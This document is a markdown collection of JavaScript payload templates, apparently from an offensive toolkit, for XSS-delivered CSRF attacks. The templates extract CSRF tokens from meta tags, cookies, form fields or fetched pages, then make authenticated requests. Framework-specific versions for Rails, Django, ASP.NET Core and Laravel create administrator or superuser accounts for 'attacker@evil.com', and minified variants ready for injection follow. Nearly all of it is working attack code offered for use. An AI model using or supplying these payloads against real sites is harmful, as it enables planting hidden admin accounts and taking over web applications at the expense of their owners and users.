# Payload Templates

Complete JavaScript payload templates for different scenarios.

## Core Template Structure

All payloads follow this structure:

```javascript
(function() {
  // 1. Extract CSRF token
  const csrfToken = /* extraction code */;

  // 2. Validate token exists
  if (!csrfToken) { return; }

  // 3. Execute authenticated action
  fetch(/* endpoint */, {
    method: /* method */,
    headers: { /* headers including CSRF */ },
    credentials: 'same-origin',
    body: /* payload */
  });
})();
```

---

## Template 1: Meta Tag + JSON API

**Use when:**
- Token in `<meta name="csrf-token">` tag
- Target accepts JSON body
- Frameworks: Rails, Laravel (Blade), Django, React apps

```javascript
(function() {
  const csrfToken = document.querySelector('meta[name="csrf-token"]')?.content;
  if (!csrfToken) { return; }

  fetch('/TARGET_ENDPOINT', {
    method: 'POST',
    headers: {
      'Content-Type': 'application/json',
      'X-CSRF-Token': csrfToken
    },
    credentials: 'same-origin',
    body: JSON.stringify({
      /* PAYLOAD_FIELDS */
    })
  });
})();
```

**Variables to replace:**
- `TARGET_ENDPOINT` - e.g., `/admin/users/invite`
- `X-CSRF-Token` - may need to be `X-CSRFToken` (Django) or `X-XSRF-TOKEN` (Angular)
- `PAYLOAD_FIELDS` - e.g., `email: 'attacker@evil.com', role: 'admin'`

---

## Template 2: Cookie Token + JSON API

**Use when:**
- Token in cookie (XSRF-TOKEN, csrftoken)
- Frameworks: Angular, Laravel, Django

```javascript
(function() {
  function getCookie(name) {
    const match = document.cookie.match(new RegExp('(^| )' + name + '=([^;]+)'));
    return match ? decodeURIComponent(match[2]) : null;
  }

  const csrfToken = getCookie('XSRF-TOKEN');
  if (!csrfToken) { return; }

  fetch('/TARGET_ENDPOINT', {
    method: 'POST',
    headers: {
      'Content-Type': 'application/json',
      'X-XSRF-TOKEN': csrfToken
    },
    credentials: 'same-origin',
    body: JSON.stringify({
      /* PAYLOAD_FIELDS */
    })
  });
})();
```

**Cookie name variations:**
- Angular/Laravel: `XSRF-TOKEN`
- Django: `csrftoken`
- Spring: `XSRF-TOKEN`

---

## Template 3: Form Field + Form Data

**Use when:**
- Token in hidden form field
- Target expects form-urlencoded data
- Frameworks: ASP.NET, traditional Django/Rails forms

```javascript
(function() {
  const csrfToken = document.querySelector('input[name="__RequestVerificationToken"]')?.value;
  if (!csrfToken) { return; }

  const formData = new URLSearchParams();
  formData.append('__RequestVerificationToken', csrfToken);
  formData.append('Email', 'attacker@evil.com');
  formData.append('Role', 'Admin');

  fetch('/TARGET_ENDPOINT', {
    method: 'POST',
    headers: {
      'Content-Type': 'application/x-www-form-urlencoded'
    },
    credentials: 'same-origin',
    body: formData
  });
})();
```

**Field name variations:**
- ASP.NET: `__RequestVerificationToken`
- Django: `csrfmiddlewaretoken`
- Rails: `authenticity_token`
- Laravel: `_token`

---

## Template 4: API Token Endpoint

**Use when:**
- Token fetched from dedicated endpoint
- SPAs with token refresh
- Async token acquisition needed

```javascript
(async function() {
  // Fetch token from API
  const tokenResponse = await fetch('/api/csrf-token');
  const { token: csrfToken } = await tokenResponse.json();
  if (!csrfToken) { return; }

  // Execute action
  await fetch('/TARGET_ENDPOINT', {
    method: 'POST',
    headers: {
      'Content-Type': 'application/json',
      'X-CSRF-Token': csrfToken
    },
    credentials: 'same-origin',
    body: JSON.stringify({
      /* PAYLOAD_FIELDS */
    })
  });
})();
```

---

## Template 5: Page Fetch + Token Extract

**Use when:**
- Token not on current page
- Need to fetch another page to get token
- Token tied to specific form/action

```javascript
(async function() {
  // Fetch page containing token
  const pageResponse = await fetch('/admin/users/new');
  const html = await pageResponse.text();

  // Parse token from response
  const parser = new DOMParser();
  const doc = parser.parseFromString(html, 'text/html');
  const csrfToken = doc.querySelector('input[name="_token"]')?.value;
  if (!csrfToken) { return; }

  // Execute action
  await fetch('/TARGET_ENDPOINT', {
    method: 'POST',
    headers: {
      'Content-Type': 'application/json',
      'X-CSRF-Token': csrfToken
    },
    credentials: 'same-origin',
    body: JSON.stringify({
      /* PAYLOAD_FIELDS */
    })
  });
})();
```

---

## Framework-Specific Templates

### Rails

```javascript
(function() {
  const csrfToken = document.querySelector('meta[name="csrf-token"]').content;
  if (!csrfToken) { return; }

  fetch('/admin/users', {
    method: 'POST',
    headers: {
      'Content-Type': 'application/json',
      'X-CSRF-Token': csrfToken,
      'Accept': 'application/json'
    },
    credentials: 'same-origin',
    body: JSON.stringify({
      user: {
        email: 'attacker@evil.com',
        role: 'admin',
        password: 'password123',
        password_confirmation: 'password123'
      }
    })
  });
})();
```

### Django

```javascript
(function() {
  function getCookie(name) {
    const match = document.cookie.match(new RegExp('(^| )' + name + '=([^;]+)'));
    return match ? match[2] : null;
  }

  const csrfToken = getCookie('csrftoken');
  if (!csrfToken) { return; }

  fetch('/admin/auth/user/add/', {
    method: 'POST',
    headers: {
      'Content-Type': 'application/json',
      'X-CSRFToken': csrfToken
    },
    credentials: 'same-origin',
    body: JSON.stringify({
      username: 'attacker',
      email: 'attacker@evil.com',
      password1: 'password123',
      password2: 'password123',
      is_staff: true,
      is_superuser: true
    })
  });
})();
```

### ASP.NET Core

```javascript
(function() {
  const csrfToken = document.querySelector('input[name="__RequestVerificationToken"]')?.value;
  if (!csrfToken) { return; }

  const formData = new URLSearchParams();
  formData.append('__RequestVerificationToken', csrfToken);
  formData.append('Input.Email', 'attacker@evil.com');
  formData.append('Input.Password', 'Password123!');
  formData.append('Input.ConfirmPassword', 'Password123!');
  formData.append('Input.Role', 'Administrator');

  fetch('/Admin/Users/Create', {
    method: 'POST',
    headers: {
      'Content-Type': 'application/x-www-form-urlencoded'
    },
    credentials: 'same-origin',
    body: formData
  });
})();
```

### Laravel

```javascript
(function() {
  const csrfToken = decodeURIComponent(
    document.cookie.match(/XSRF-TOKEN=([^;]+)/)?.[1] || ''
  );
  if (!csrfToken) { return; }

  fetch('/api/admin/users', {
    method: 'POST',
    headers: {
      'Content-Type': 'application/json',
      'X-XSRF-TOKEN': csrfToken,
      'Accept': 'application/json'
    },
    credentials: 'same-origin',
    body: JSON.stringify({
      name: 'Attacker',
      email: 'attacker@evil.com',
      password: 'password123',
      password_confirmation: 'password123',
      role_id: 1
    })
  });
})();
```

---

## Minified Templates

### Meta Tag + JSON (minified)

```javascript
(function(){var t=document.querySelector('meta[name="csrf-token"]')?.content;if(!t)return;fetch('/TARGET',{method:'POST',headers:{'Content-Type':'application/json','X-CSRF-Token':t},credentials:'same-origin',body:JSON.stringify({email:'a@e.co',role:'admin'})})})();
```

### Cookie + JSON (minified)

```javascript
(function(){var m=document.cookie.match(/XSRF-TOKEN=([^;]+)/);if(!m)return;fetch('/TARGET',{method:'POST',headers:{'Content-Type':'application/json','X-XSRF-TOKEN':decodeURIComponent(m[1])},credentials:'same-origin',body:JSON.stringify({email:'a@e.co',role:'admin'})})})();
```
